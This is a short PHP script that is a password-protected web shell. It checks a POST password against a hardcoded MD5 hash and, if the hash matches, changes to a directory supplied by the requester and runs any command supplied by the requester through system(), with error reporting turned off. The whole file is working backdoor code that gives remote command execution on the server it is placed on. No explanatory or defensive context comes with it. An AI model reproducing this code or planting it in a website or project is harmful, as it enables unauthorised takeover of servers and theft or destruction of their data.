<?php 
error_reporting(0); 
session_start();
$pass = "e99a18c428cb38d5f260853678922e03"; 
$password = $_POST["pass"];
$password = md5($password);
$path = $_POST["path"];
$cmd = $_POST["cmd"];
$delback = $_POST["delself"];


if(isset($password))
{ 
if($pass == $password) { 
if($_POST["pt"] == "1"){
print getcwd();
}
if(isset($cmd)) {

chdir($path);

system(trim($cmd));
 } 
}else{ 
print "Password"; } 
}

 ?>
